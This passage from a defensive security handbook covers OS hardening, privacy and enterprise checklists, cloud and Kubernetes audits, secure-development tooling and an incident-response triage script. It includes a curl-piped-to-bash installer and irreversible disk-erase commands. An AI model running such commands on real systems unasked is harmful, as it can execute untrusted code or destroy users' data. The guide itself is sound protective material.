    Set-Service -Name $svc -StartupType Disabled -ErrorAction SilentlyContinue
    Stop-Service -Name $svc -Force -ErrorAction SilentlyContinue
    Write-Host "Disabled: $svc"
}

# Credential Guard
# Enable via Group Policy or:
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard" -Name "EnableVirtualizationBasedSecurity" -Value 1
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard" -Name "RequirePlatformSecurityFeatures" -Value 1

# BitLocker
Enable-BitLocker -MountPoint "C:" -EncryptionMethod XtsAes256 -UsedSpaceOnly -TpmProtector
```

---

### 6.3 macOS Hardening

```bash
# Enable FileVault full-disk encryption
sudo fdesetup enable

# Firewall
sudo /usr/libexec/ApplicationFirewall/socketfilterfw --setglobalstate on
sudo /usr/libexec/ApplicationFirewall/socketfilterfw --setstealthmode on
sudo /usr/libexec/ApplicationFirewall/socketfilterfw --setloggingmode on

# Disable remote services
sudo systemsetup -setremotelogin off               # SSH (enable if needed)
sudo systemsetup -setremoteappleevents off
sudo launchctl unload -w /System/Library/LaunchDaemons/com.apple.screensharing.plist 2>/dev/null

# Disable automatic login
sudo defaults delete /Library/Preferences/com.apple.loginwindow autoLoginUser 2>/dev/null

# Require password after sleep/screensaver immediately
defaults write com.apple.screensaver askForPassword -int 1
defaults write com.apple.screensaver askForPasswordDelay -int 0

# Disable Bonjour advertising
sudo defaults write /Library/Preferences/com.apple.mDNSResponder.plist NoMulticastAdvertisements -bool YES

# Show hidden files
defaults write com.apple.finder AppleShowAllFiles -bool true

# Enable Gatekeeper
sudo spctl --master-enable

# Check for and enable SIP
csrutil status  # Should show "enabled"

# Disable root account
sudo dsenableroot -d

# Lock screen quickly (add to menu bar)
# System Preferences → Security & Privacy → General → Require password immediately

# Application Layer Firewall (ALF) — block all incoming connections
sudo /usr/libexec/ApplicationFirewall/socketfilterfw --setblockall on

# Disable IPv6 if not needed
networksetup -setv6off Wi-Fi
networksetup -setv6off Ethernet

# Enable Lockdown Mode (macOS 13+ Ventura) — extreme security for high-risk individuals
# System Preferences → Privacy & Security → Lockdown Mode → Turn On Lockdown Mode

# mDNS / AirDrop restrictions
sudo defaults write /Library/Preferences/com.apple.NetworkBrowser BrowseAllInterfaces 0

# Safari security settings (via Terminal)
defaults write com.apple.Safari WebKitJavaScriptEnabled -bool false  # Disable JS (breaks most sites)
defaults write com.apple.Safari SendDoNotTrackHTTPHeader -bool true
defaults write com.apple.Safari PreventCrossSiteTracking -bool true
```

---

## 7. Personal & Enterprise Security Checklists

### 7.1 Personal Device Security

#### 📱 Smartphone Security

- [ ] Use a strong PIN (6+ digits) or passphrase (not fingerprint as sole authentication in high-risk situations)
- [ ] Enable full-device encryption (on by default in modern Android/iOS)
- [ ] Enable "Find My" or "Find My Device" for remote wipe capability
- [ ] Keep OS and apps updated immediately upon release
- [ ] Only install apps from official stores; review permissions before granting
- [ ] Disable Bluetooth and NFC when not in use
- [ ] Disable Wi-Fi auto-connect to open networks
- [ ] Enable two-factor authentication on all important accounts
- [ ] Use an authenticator app (not SMS) for 2FA
- [ ] Disable lock screen notifications that reveal content
- [ ] Review app permissions quarterly — remove unnecessary access
- [ ] Use a VPN on public Wi-Fi
- [ ] Disable USB debugging (Android)
- [ ] Enable USB Restricted Mode (iOS) — requires passcode after 1 hour
- [ ] Back up device encrypted and regularly
- [ ] Use Signal for sensitive communications
- [ ] Enable Google Play Protect or iOS's built-in scanning
- [ ] Set SIM card PIN to prevent SIM swap attacks
- [ ] Disable Siri/Google Assistant on lock screen
- [ ] Consider mobile threat defense (MTD) app for corporate devices

#### 💻 Computer Security

- [ ] Enable full-disk encryption (BitLocker/FileVault/LUKS)
- [ ] Set BIOS/UEFI password and disable boot from USB by default
- [ ] Enable Secure Boot
- [ ] Use a strong account password — minimum 16 characters
- [ ] Configure automatic screen lock after 5 minutes of inactivity
- [ ] Enable automatic OS updates
- [ ] Use an antivirus/EDR solution
- [ ] Keep all software and browsers updated
- [ ] Use a standard (non-admin) account for daily use
- [ ] Enable a software firewall
- [ ] Encrypt sensitive files before storing/sharing
- [ ] Use a hardware security key (YubiKey) for critical accounts
- [ ] Audit installed software — remove unused applications
- [ ] Use separate browser profiles for work/personal/shopping
- [ ] Check for and remove stalkerware or monitoring software
- [ ] Physically cover webcam when not in use
- [ ] Disable microphone at OS level when not needed
- [ ] Use a privacy screen on laptop in public spaces
- [ ] Verify downloads via checksum before installing
- [ ] Shred sensitive files (don't just delete)

---

### 7.2 Browser Privacy Checklist

#### Firefox Hardening

```
about:config — Key settings:
privacy.trackingprotection.enabled = true
privacy.trackingprotection.socialtracking.enabled = true
geo.enabled = false
dom.battery.enabled = false
dom.gamepad.enabled = false
media.navigator.enabled = false  (disables WebRTC — may break video calls)
network.dns.disablePrefetch = true
network.prefetch-next = false
browser.send_pings = false
dom.webnotifications.enabled = false
extensions.pocket.enabled = false
browser.newtabpage.activity-stream.feeds.telemetry = false
browser.newtabpage.activity-stream.telemetry = false
toolkit.telemetry.enabled = false
```

#### Essential Browser Extensions

| Extension | Purpose | Link |
|-----------|---------|-------|
| uBlock Origin | Ad/tracker blocking | [Firefox](https://addons.mozilla.org/firefox/addon/ublock-origin/) |
| Privacy Badger | Tracker blocking (EFF) | [EFF](https://privacybadger.org/) |
| HTTPS Everywhere | Force HTTPS | [EFF](https://www.eff.org/https-everywhere) |
| Decentraleyes | CDN privacy | [Decentraleyes](https://decentraleyes.org/) |
| Cookie AutoDelete | Automated cookie management | [GitHub](https://github.com/Cookie-AutoDelete/Cookie-AutoDelete) |
| Bitwarden | Password manager | [Bitwarden](https://bitwarden.com) |
| Multi-Account Containers | Firefox — Isolate sites | [Mozilla](https://support.mozilla.org/kb/containers) |
| NoScript | Block JavaScript per-site | [NoScript](https://noscript.net/) |

#### Browser Security Checklist

- [ ] Use Firefox or a privacy-focused browser (Brave, LibreWolf)
- [ ] Install uBlock Origin — use medium/hard mode for stronger blocking
- [ ] Enable DNS-over-HTTPS (DoH): Settings → Privacy → DNS over HTTPS
- [ ] Disable third-party cookies
- [ ] Enable Enhanced Tracking Protection to "Strict"
- [ ] Clear cookies and site data on browser close
- [ ] Avoid Chrome as primary browser for privacy (Google collects data)
- [ ] Use separate browsers or profiles for different tasks
- [ ] Never save passwords in the browser — use a password manager
- [ ] Don't sync browser data to cloud without encryption
- [ ] Audit browser extensions — remove unnecessary ones (attack surface)
- [ ] Disable WebRTC if not using video calls (can leak real IP)
- [ ] Use Private/Incognito mode for sensitive searches
- [ ] Consider [Tor Browser](https://www.torproject.org/) for high-anonymity needs
- [ ] Verify SSL certificate before entering sensitive information
- [ ] Be aware of certificate pinning bypasses in corporate environments

---

### 7.3 Email Security Checklist

- [ ] Use an email provider with end-to-end encryption support ([Proton Mail](https://proton.me), [Tutanota](https://tutanota.com))
- [ ] Enable 2FA on email account (this is your password reset gateway!)
- [ ] Use PGP/GPG encryption for sensitive emails
- [ ] Never click links in unexpected emails — go to site directly
- [ ] Verify sender's email address (not just display name) before trusting
- [ ] Be suspicious of urgency: "Your account will be closed in 24 hours!"
- [ ] Disable automatic image loading (prevents tracking pixels)
- [ ] Use email aliasing for services ([SimpleLogin](https://simplelogin.io), [AnonAddy](https://addy.io))
- [ ] Use a separate email for account recovery and keep it private
- [ ] Configure SPF, DKIM, DMARC for your domain (for operators)
- [ ] Check email headers for suspicious relay paths
- [ ] Use S/MIME certificates for corporate email signing
- [ ] Enable spam filtering at server level
- [ ] Never open attachments from unknown senders
- [ ] Verify PDF/DOC files in sandbox (VirusTotal) before opening
- [ ] Be wary of QR codes in emails (quishing attacks)

**Email Header Analysis:**
```bash
# Extract and analyze email headers (paste full headers here)
# Check: Received, Authentication-Results, DKIM-Signature, SPF

# SPF check
dig TXT example.com | grep "v=spf"
# Should show: v=spf1 include:... -all  (-all = fail, ~all = soft fail, +all = BAD!)

# DMARC check
dig TXT _dmarc.example.com | grep "v=DMARC"
# Should show: v=DMARC1; p=reject; rua=mailto:...

# DKIM check
dig TXT selector._domainkey.example.com | grep "v=DKIM"
```

---

### 7.4 Network Security Checklist

#### Home Network

- [ ] Change router admin username AND password from defaults immediately
- [ ] Update router firmware (check monthly)
- [ ] Use WPA3 encryption (or WPA2-AES if WPA3 unavailable — never WEP or WPA-TKIP)
- [ ] Change default Wi-Fi SSID (don't include ISP name, home address, or name)
- [ ] Disable WPS (Wi-Fi Protected Setup) — vulnerable to brute force
- [ ] Create a separate guest network for IoT devices and visitors
- [ ] Disable UPnP (allows devices to open ports without your knowledge)
- [ ] Enable router-level DNS filtering (NextDNS, Pi-hole, Cloudflare for Families)
- [ ] Disable remote management unless specifically needed
- [ ] Review connected devices regularly — remove unknown devices
- [ ] Use DNS-over-HTTPS or DNS-over-TLS on router
- [ ] Consider a VLAN for IoT devices
- [ ] Disable IPv6 if your ISP doesn't use it (reduces attack surface)
- [ ] Set up firewall rules — deny all inbound, allow specific outbound
- [ ] Monitor router logs periodically

#### Pi-hole Setup (Network-wide DNS filtering)

```bash
# Install Pi-hole
curl -sSL https://install.pi-hole.net | bash

# Configure as DHCP server (or point router DNS to Pi-hole IP)
# Add blocklists: https://firebog.net/

# Post-install configuration
pihole -a -p               # Set admin password
pihole status
pihole -g                  # Update gravity (blocklists)
pihole -q malware.com      # Query if domain is blocked
pihole blacklist evil.com  # Manual block
pihole whitelist good.com  # Whitelist

# Additional blocklists to add (Pi-hole Admin → Adlists):
# https://raw.githubusercontent.com/StevenBlack/hosts/master/hosts
# https://raw.githubusercontent.com/nicehash/nicehash-list/main/domains.txt  (crypto mining)
# https://blocklistproject.github.io/Lists/malware.txt
# https://urlhaus.abuse.ch/downloads/hostfile/
```

---

### 7.5 Physical Security Checklist

- [ ] Lock screen whenever leaving device unattended (Win+L / Cmd+Ctrl+Q)
- [ ] Use a privacy screen on laptops in public
- [ ] Never leave devices in unattended vehicles
- [ ] Use cable locks for laptops in semi-public spaces (coworking, cafés)
- [ ] Be aware of shoulder surfing when entering passwords
- [ ] Shred physical documents containing sensitive information
- [ ] Verify identity of "IT support" who comes to your desk
- [ ] Don't plug in USB drives found in parking lots or public spaces
- [ ] Use a Faraday bag for sensitive devices when traveling internationally
- [ ] Enable tamper-evident seals on server hardware
- [ ] Secure data center access with badge + biometric (two-factor)
- [ ] Install security cameras at data center entry points
- [ ] Use locked server racks
- [ ] Maintain visitor logs for data center access
- [ ] Secure destruction of decommissioned drives (physical shredding, degauss)
- [ ] Be aware of "evil maid" attacks when hotel/travel devices
- [ ] Consider hardware security keys vs software-only 2FA for high-risk accounts

---

### 7.6 OPSEC Best Practices

Operational Security (OPSEC) is the process of protecting critical information by identifying potential threats, vulnerabilities, and risks.

#### The 5-Step OPSEC Process

```
1. IDENTIFY CRITICAL INFORMATION
   What information would be valuable to an adversary?
   - Passwords, API keys, access credentials
   - Personal identifying information (PII)
   - Financial information
   - Location and routine data
   - Business-sensitive communications

2. ANALYZE THREATS
   Who wants this information?
   - Cybercriminals (financial motivation)
   - Nation-state actors (espionage)
   - Competitors (corporate intelligence)
   - Stalkers/harassers

3. ANALYZE VULNERABILITIES
   How could adversaries obtain this information?
   - Social media oversharing
   - Insecure communications
   - Phishing attacks
   - Physical surveillance
   - Metadata in files/images

4. ASSESS RISKS
   Likelihood × Impact = Risk

5. APPLY COUNTERMEASURES
   Implement protections proportional to the risk
```

#### Practical OPSEC Measures

```bash
# Remove metadata from images before sharing
sudo apt install exiftool
exiftool -all= photo.jpg                # Strip all metadata
exiftool photo.jpg | grep GPS          # Check for GPS data

# Remove metadata from PDFs
sudo apt install ghostscript
gs -dBATCH -dNOPAUSE -dSAFER -sDEVICE=pdfwrite -dPDFSETTINGS=/default \
   -sOutputFile=cleaned.pdf input.pdf

# Check what documents reveal
strings document.docx | grep -E "username|author|computer"

# Secure deletion of files
sudo apt install secure-delete
srm -vz sensitive_file.txt            # Secure remove
srm -rfvz sensitive_directory/         # Secure remove directory

# On SSDs, use:
sudo hdparm --security-erase /dev/sda  # ATA Secure Erase

# Anonymize internet traffic (basic)
# Use Tor Browser for anonymous browsing
# Use Tails OS for comprehensive anonymity:
# https://tails.boum.org/

# Check for data breaches
# https://haveibeenpwned.com/
# https://monitor.firefox.com/

# OPSEC checklist for developers
# - Never commit secrets to Git
# - Use .gitignore for .env files
# - Rotate API keys that may have been exposed
# - Use vault/secrets manager, not environment variables in production
# - Audit git history for accidental secret commits:
git log -S "password" --all --oneline
git log -S "api_key" --all --oneline
```

**Social Media OPSEC:**
- [ ] Audit privacy settings on all platforms quarterly
- [ ] Don't post real-time location information
- [ ] Avoid posting work details that reveal security posture
- [ ] Use separate accounts for professional and personal use
- [ ] Disable geotagging on phone camera
- [ ] Remove EXIF metadata from photos before posting
- [ ] Use pseudonyms where appropriate
- [ ] Be aware that "private" posts can be screenshotted
- [ ] Review tagged photos and posts
- [ ] Limit information visible to "friends of friends"

---

### 7.7 Enterprise Security Checklist

#### Access Control & Identity

- [ ] Implement Zero Trust Architecture (never trust, always verify)
- [ ] Enforce MFA for all employees — especially for VPN, email, and admin consoles
- [ ] Use hardware security keys (FIDO2/WebAuthn) for privileged accounts
- [ ] Implement Privileged Access Management (PAM) solution
- [ ] Apply Principle of Least Privilege (PoLP) — minimum permissions needed
- [ ] Conduct quarterly access reviews — revoke unnecessary permissions
- [ ] Disable accounts within 24 hours of employee offboarding
- [ ] Implement Just-In-Time (JIT) access for privileged operations
- [ ] Separate admin accounts from regular user accounts
- [ ] Monitor and alert on privileged account usage
- [ ] Implement password manager for all employees
- [ ] Enforce minimum password length of 16 characters (or use passphrases)
- [ ] Disable password hints
- [ ] Implement account lockout after 5 failed attempts

#### Network Security

- [ ] Network segmentation — separate production, development, corporate networks
- [ ] Deploy Next-Generation Firewall (NGFW) with application awareness
- [ ] Implement IDS/IPS at network perimeter and internal segments
- [ ] Deploy proxy server for web traffic inspection
- [ ] Enable SSL/TLS inspection on firewall (with employee disclosure)
- [ ] Block all unused ports and protocols
- [ ] Monitor and alert on unexpected outbound connections
- [ ] Implement DNS filtering (Cisco Umbrella, Zscaler, NextDNS Teams)
- [ ] Conduct regular firewall rule audits — remove obsolete rules
- [ ] Use VPN with certificate-based authentication for remote access
- [ ] Deploy 802.1X network access control (NAC) for wired access
- [ ] Wireless: Use WPA3-Enterprise with RADIUS authentication
- [ ] Separate guest Wi-Fi with captive portal

#### Endpoint Security

- [ ] Deploy EDR solution on all endpoints
- [ ] Enable application whitelisting on critical systems
- [ ] Enforce full-disk encryption on all devices
- [ ] Mobile Device Management (MDM) for corporate mobile devices
- [ ] Automated patch management — deploy critical patches within 48 hours
- [ ] Regular vulnerability scanning of all endpoints
- [ ] Disable USB storage on managed devices (or apply device control policies)
- [ ] Deploy host-based firewall via policy
- [ ] BIOS/UEFI passwords and Secure Boot on all devices

#### Monitoring & Response

- [ ] Deploy SIEM with 24/7 monitoring
- [ ] Establish security baselines — alert on deviations
- [ ] Centralize log collection from all systems (90+ day retention)
- [ ] Implement User and Entity Behavior Analytics (UEBA)
- [ ] Run regular threat hunting exercises
- [ ] Conduct tabletop exercises for incident response scenarios
- [ ] Maintain and test Incident Response Plan (IRP)
- [ ] Establish communication tree for security incidents
- [ ] Subscribe to threat intelligence feeds
- [ ] Monitor dark web for credential leaks (SpyCloud, Digital Shadows)

#### Data Protection

- [ ] Data classification policy — label all data (Public/Internal/Confidential/Secret)
- [ ] Data Loss Prevention (DLP) solution for sensitive data
- [ ] Encrypt sensitive data at rest and in transit (minimum TLS 1.2, prefer 1.3)
- [ ] Regular encrypted backups — test restore quarterly
- [ ] Offsite/cloud backup for disaster recovery
- [ ] GDPR/CCPA compliance program if applicable
- [ ] Third-party vendor security assessments
- [ ] Data retention and disposal policy

---

## 8. Cloud Security

### 8.1 AWS Security

```bash
# AWS Security Audit — using AWS CLI

# Check IAM password policy
aws iam get-account-password-policy

# List users without MFA
aws iam list-users --query 'Users[*].UserName' --output text | tr '\t' '\n' | while read user; do
    mfa=$(aws iam list-mfa-devices --user-name "$user" --query 'MFADevices[*].SerialNumber' --output text)
    if [ -z "$mfa" ]; then
        echo "NO MFA: $user"
    fi
done

# Find root account usage
aws cloudtrail lookup-events \
    --lookup-attributes AttributeKey=Username,AttributeValue=root \
    --query 'Events[*].[EventTime,EventName,SourceIPAddress]' \
    --output table

# Check for exposed S3 buckets
aws s3api list-buckets --query 'Buckets[*].Name' --output text | tr '\t' '\n' | while read bucket; do
    acl=$(aws s3api get-bucket-acl --bucket "$bucket" 2>/dev/null | python3 -c "import sys,json; data=json.load(sys.stdin); print(any(g.get('URI','')=='http://acs.amazonaws.com/groups/global/AllUsers' for grant in data['Grants'] for g in [grant.get('Grantee',{})]))")
    if [ "$acl" = "True" ]; then
        echo "PUBLIC BUCKET: $bucket"
    fi
done

# Enable AWS Security Hub
aws securityhub enable-security-hub \
    --enable-default-standards \
    --tags Key=Environment,Value=Production

# Enable GuardDuty
aws guardduty create-detector --enable --finding-publishing-frequency FIFTEEN_MINUTES

# Enable CloudTrail in all regions
aws cloudtrail create-trail \
    --name AllRegionsTrail \
    --s3-bucket-name my-cloudtrail-bucket \
    --is-multi-region-trail \
    --include-global-service-events \
    --enable-log-file-validation

aws cloudtrail start-logging --name AllRegionsTrail

# Enable Config
aws configservice put-configuration-recorder \
    --configuration-recorder name=default,roleARN=arn:aws:iam::123456789012:role/ConfigRole \
    --recording-group allSupported=true,includeGlobalResourceTypes=true

aws configservice start-configuration-recorder --configuration-recorder-name default
```

**AWS IAM Policy Hardening:**
```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Sid": "DenyWithoutMFA",
            "Effect": "Deny",
            "NotAction": [
                "iam:CreateVirtualMFADevice",
                "iam:EnableMFADevice",
                "iam:GetUser",
                "iam:ListMFADevices",
                "iam:ListVirtualMFADevices",
                "iam:ResyncMFADevice",
                "sts:GetSessionToken"
            ],
            "Resource": "*",
            "Condition": {
                "BoolIfExists": {
                    "aws:MultiFactorAuthPresent": "false"
                }
            }
        },
        {
            "Sid": "DenyLeavingRegions",
            "Effect": "Deny",
            "Action": "*",
            "Resource": "*",
            "Condition": {
                "StringNotEquals": {
                    "aws:RequestedRegion": ["us-east-1", "us-west-2", "eu-west-1"]
                }
            }
        }
    ]
}
```

---

### 8.2 GCP Security

```bash
# GCP Security audit

# Enable Security Command Center
gcloud services enable securitycenter.googleapis.com

# Check for public storage buckets
gsutil ls | while read bucket; do
    acl=$(gsutil iam get "$bucket" 2>/dev/null | grep "allUsers\|allAuthenticatedUsers")
    if [ -n "$acl" ]; then
        echo "PUBLIC: $bucket"
    fi
done

# Enable Cloud Audit Logs
gcloud projects get-iam-policy PROJECT_ID
gcloud services enable cloudaudit.googleapis.com

# List service accounts with key files (minimize key usage)
gcloud iam service-accounts list --format="value(email)" | while read sa; do
    keys=$(gcloud iam service-accounts keys list --iam-account="$sa" --filter="keyType=USER_MANAGED" --format="value(name)")
    if [ -n "$keys" ]; then
        echo "USER-MANAGED KEYS: $sa"
        echo "$keys"
    fi
done

# Enable VPC Flow Logs
gcloud compute networks subnets update SUBNET_NAME \
    --region=REGION \
    --enable-flow-logs \
    --logging-filter-expr="src_ip != dst_ip"

# Enable binary authorization
gcloud services enable binaryauthorization.googleapis.com
```

---

### 8.3 Azure Security

```powershell
# Connect to Azure
Connect-AzAccount
Connect-MgGraph -Scopes "User.Read.All","Group.Read.All","Policy.Read.All"

# Enable Microsoft Defender for Cloud on all subscriptions
Get-AzSubscription | ForEach-Object {
    Set-AzContext -Subscription $_.Id
    Set-AzSecurityPricing -Name VirtualMachines -PricingTier Standard
    Set-AzSecurityPricing -Name SqlServers -PricingTier Standard
    Set-AzSecurityPricing -Name AppServices -PricingTier Standard
    Set-AzSecurityPricing -Name StorageAccounts -PricingTier Standard
    Set-AzSecurityPricing -Name KeyVaults -PricingTier Standard
}

# Find users without MFA
Get-MgUser -All | ForEach-Object {
    $methods = Get-MgUserAuthenticationMethod -UserId $_.Id
    if ($methods.Count -eq 1) {  # Only password
        Write-Output "NO MFA: $($_.DisplayName) - $($_.UserPrincipalName)"
    }
}

# Enable Azure AD Privileged Identity Management (PIM)
# Requires Azure AD P2 license
# Sets admin roles to require MFA + approval + time-limited access

# Check for public storage accounts
Get-AzStorageAccount | Where-Object {$_.AllowBlobPublicAccess -eq $true} | 
    Select-Object ResourceGroupName, StorageAccountName
```

---

## 9. Container & Kubernetes Security

```bash
# Docker Security

# Scan image for vulnerabilities
docker run --rm -v /var/run/docker.sock:/var/run/docker.sock \
    aquasec/trivy image myapp:latest

# CIS Docker Benchmark assessment
docker run --net host --pid host --userns host --cap-add audit_control \
    -e DOCKER_CONTENT_TRUST=$DOCKER_CONTENT_TRUST \
    -v /etc:/etc:ro \
    -v /lib/systemd/system:/lib/systemd/system:ro \
    -v /usr/bin/containerd:/usr/bin/containerd:ro \
    -v /usr/bin/runc:/usr/bin/runc:ro \
    -v /usr/lib/systemd:/usr/lib/systemd:ro \
    -v /var/lib:/var/lib:ro \
    -v /var/run/docker.sock:/var/run/docker.sock:ro \
    --label docker_bench_security \
    docker/docker-bench-security

# Secure Dockerfile practices
cat > Dockerfile.secure << 'EOF'
# Use specific digest instead of latest tag
FROM node:20-alpine@sha256:abc123...

# Run as non-root user
RUN addgroup -g 1001 -S appgroup && \
    adduser -u 1001 -S appuser -G appgroup

# Don't run as root
USER appuser

# Drop all capabilities, add only needed ones
# (set in docker-compose or Kubernetes pod spec)

# Read-only root filesystem
# (set in docker-compose: read_only: true)

# Remove package manager caches
RUN npm ci --only=production && \
    npm cache clean --force && \
    rm -rf /tmp/*

# No hardcoded secrets — use environment variables
ENV NODE_ENV=production
# Secrets injected at runtime via Vault, AWS Secrets Manager, etc.

EXPOSE 3000

HEALTHCHECK --interval=30s --timeout=3s --start-period=5s --retries=3 \
    CMD wget --quiet --tries=1 http://localhost:3000/health -O - || exit 1

CMD ["node", "server.js"]
EOF
```

**Kubernetes Security:**
```yaml
# Pod Security Standards — Restricted policy example
apiVersion: v1
kind: Pod
metadata:
  name: secure-pod
  labels:
    app: myapp
spec:
  securityContext:
    runAsNonRoot: true
    runAsUser: 1000
    runAsGroup: 3000
    fsGroup: 2000
    seccompProfile:
      type: RuntimeDefault
  
  containers:
  - name: myapp
    image: myapp:1.0.0@sha256:abc123...
    
    securityContext:
      allowPrivilegeEscalation: false
      readOnlyRootFilesystem: true
      runAsNonRoot: true
      capabilities:
        drop:
          - ALL
    
    resources:
      limits:
        memory: "128Mi"
        cpu: "500m"
      requests:
        memory: "64Mi"
        cpu: "250m"
    
    volumeMounts:
    - name: tmp
      mountPath: /tmp
    - name: cache
      mountPath: /app/cache
  
  volumes:
  - name: tmp
    emptyDir: {}
  - name: cache
    emptyDir: {}

---
# Network Policy — Default deny all, then allow specific
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny-all
  namespace: production
spec:
  podSelector: {}
  policyTypes:
  - Ingress
  - Egress

---
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-frontend-to-backend
  namespace: production
spec:
  podSelector:
    matchLabels:
      app: backend
  policyTypes:
  - Ingress
  ingress:
  - from:
    - podSelector:
        matchLabels:
          app: frontend
    ports:
    - protocol: TCP
      port: 8080
```

```bash
# Kubernetes security audit
# Install kube-bench
kubectl apply -f https://raw.githubusercontent.com/aquasecurity/kube-bench/main/job.yaml
kubectl logs job/kube-bench

# Scan K8s cluster with kube-hunter
pip install kube-hunter
kube-hunter --remote CLUSTER_IP

# Falco — Runtime security for Kubernetes
helm repo add falcosecurity https://falcosecurity.github.io/charts
helm install falco falcosecurity/falco \
    --set falco.jsonOutput=true \
    --set falcosidekick.enabled=true \
    --set falcosidekick.config.slack.webhookurl=YOUR_SLACK_WEBHOOK

# Monitor Falco alerts
kubectl logs -l app.kubernetes.io/name=falco -n falco -f
```

---

## 10. Secure Development Practices

```bash
# SAST — Static Application Security Testing
# Semgrep
pip install semgrep
semgrep --config auto ./src/                           # Auto-detect language and rules
semgrep --config "p/owasp-top-ten" ./src/
semgrep --config "p/secrets" ./src/                    # Find hardcoded secrets

# Bandit (Python)
pip install bandit
bandit -r ./myapp/ -f json -o bandit_report.json
bandit -r ./myapp/ -ll                                 # Only medium and high severity

# ESLint Security (JavaScript/TypeScript)
npm install --save-dev eslint eslint-plugin-security
# Add to .eslintrc:
# "plugins": ["security"],
# "extends": ["plugin:security/recommended"]

# SonarQube (self-hosted SAST)
docker run -d --name sonarqube -e SONAR_ES_BOOTSTRAP_CHECKS_DISABLE=true \
    -p 9000:9000 sonarqube:community
# Access at http://localhost:9000 (admin/admin)
# Install sonar-scanner and run:
sonar-scanner \
    -Dsonar.projectKey=myproject \
    -Dsonar.sources=src \
    -Dsonar.host.url=http://localhost:9000 \
    -Dsonar.login=YOUR_TOKEN

# Secret scanning
# Trufflehog
docker run --rm -it trufflesecurity/trufflehog:latest git \
    --repo https://github.com/myorg/myrepo

# git-secrets (AWS)
git secrets --install
git secrets --register-aws
git secrets --scan -r ./

# Pre-commit hooks for security
pip install pre-commit
cat > .pre-commit-config.yaml << 'EOF'
repos:
  - repo: https://github.com/gitleaks/gitleaks
    rev: v8.18.0
    hooks:
      - id: gitleaks
  
  - repo: https://github.com/PyCQA/bandit
    rev: 1.7.5
    hooks:
      - id: bandit
        args: ["-c", "pyproject.toml"]
  
  - repo: https://github.com/returntocorp/semgrep
    rev: v1.50.0
    hooks:
      - id: semgrep
        args: ["--config", "auto"]
  
  - repo: https://github.com/pre-commit/pre-commit-hooks
    rev: v4.5.0
    hooks:
      - id: detect-private-key
      - id: detect-aws-credentials
EOF

pre-commit install
pre-commit run --all-files

# Dependency vulnerability scanning
# Python
pip install pip-audit safety
pip-audit
safety check

# Node.js
npm audit
npm install -g better-npm-audit
better-npm-audit audit --level high

# Go
go install golang.org/x/vuln/cmd/govulncheck@latest
govulncheck ./...

# Java
mvn org.owasp:dependency-check-maven:check   # OWASP Dependency Check

# Ruby
gem install bundler-audit
bundle-audit check --update
```

---

## 11. Incident Response Playbooks

### IR Phase 1: Preparation

```bash
# Maintain these before an incident occurs:
# - Asset inventory (CMDB)
# - Network diagrams and baselines
# - Incident response plan (IRP)
# - Communication templates
# - Legal contact information
# - Forensic workstation ready

# Create forensic toolkit
sudo apt install dc3dd volatility3 autopsy sleuthkit foremost scalpel binwalk \
    exiftool bulk_extractor hashdeep ssdeep xxd strings gdb wireshark tshark \
    tcpdump nmap netcat socat

# Create baseline hashes
sudo find /bin /sbin /usr/bin /usr/sbin /etc -type f -exec sha256sum {} + > /root/baseline_hashes.txt
sudo find /lib /lib64 /usr/lib -type f -name "*.so*" -exec sha256sum {} + >> /root/baseline_hashes.txt
```

### IR Phase 2: Detection & Analysis

```bash
# LINUX INCIDENT TRIAGE SCRIPT
#!/bin/bash
# Run this as root to collect volatile data

INCIDENT_DIR="/tmp/ir_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$INCIDENT_DIR"

echo "[*] Collecting volatile data..."

# System info
date > "$INCIDENT_DIR/00_timestamp.txt"
uname -a >> "$INCIDENT_DIR/00_timestamp.txt"
uptime >> "$INCIDENT_DIR/00_timestamp.txt"

# Running processes
ps auxf > "$INCIDENT_DIR/01_processes.txt"
ps aux --sort=-%cpu | head -30 >> "$INCIDENT_DIR/01_processes_cpu.txt"

# Network connections
ss -tlnp > "$INCIDENT_DIR/02_listening_ports.txt"
ss -anp > "$INCIDENT_DIR/02_all_connections.txt"
netstat -rn > "$INCIDENT_DIR/02_routing_table.txt"
ip neigh show > "$INCIDENT_DIR/02_arp_cache.txt"

# Users logged in
who > "$INCIDENT_DIR/03_logged_in_users.txt"
last -30 > "$INCIDENT_DIR/03_last_30_logins.txt"
lastb -30 > "$INCIDENT_DIR/03_last_30_failed_logins.txt" 2>/dev/null

# Startup items
ls -la /etc/cron* /var/spool/cron/* > "$INCIDENT_DIR/04_cron.txt" 2>/dev/null
systemctl list-units --type=service --state=running > "$INCIDENT_DIR/04_services.txt"
cat /etc/rc.local >> "$INCIDENT_DIR/04_startup.txt" 2>/dev/null

# Open files
lsof -i > "$INCIDENT_DIR/05_open_network_files.txt"
lsof +L1 > "$INCIDENT_DIR/05_deleted_but_open_files.txt"

# File system changes
find / -mtime -1 -type f 2>/dev/null | grep -v -E "/proc|/sys|/dev" > "$INCIDENT_DIR/06_recent_files_24h.txt"
find /tmp /var/tmp -type f -exec ls -la {} + > "$INCIDENT_DIR/06_tmp_files.txt" 2>/dev/null

# SUID/SGID files
find / -perm -4000 -o -perm -2000 -type f 2>/dev/null > "$INCIDENT_DIR/07_suid_sgid.txt"

# Authentication logs
grep -E "Failed|success|invalid|sudo" /var/log/auth.log | tail -1000 > "$INCIDENT_DIR/08_auth_activity.txt" 2>/dev/null
journalctl -u ssh --since "1 day ago" > "$INCIDENT_DIR/08_ssh_logs.txt" 2>/dev/null

# Bash history for all users
for home in /root /home/*; do
    user=$(basename "$home")
    if [ -f "$home/.bash_history" ]; then
        echo "=== $user ===" >> "$INCIDENT_DIR/09_bash_history.txt"
        cat "$home/.bash_history" >> "$INCIDENT_DIR/09_bash_history.txt"
    fi
done

# Hash collection for comparison
sha256sum $(find /bin /sbin /usr/bin /usr/sbin -type f 2>/dev/null) > "$INCIDENT_DIR/10_binary_hashes.txt"

# Kernel modules
lsmod > "$INCIDENT_DIR/11_kernel_modules.txt"
cat /proc/modules >> "$INCIDENT_DIR/11_kernel_modules.txt"

# Memory dump (if avmpore available)
# avmpore -o "$INCIDENT_DIR/memory.dump" 2>/dev/null

echo "[*] Collection complete: $INCIDENT_DIR"
ls -lh "$INCIDENT_DIR/"
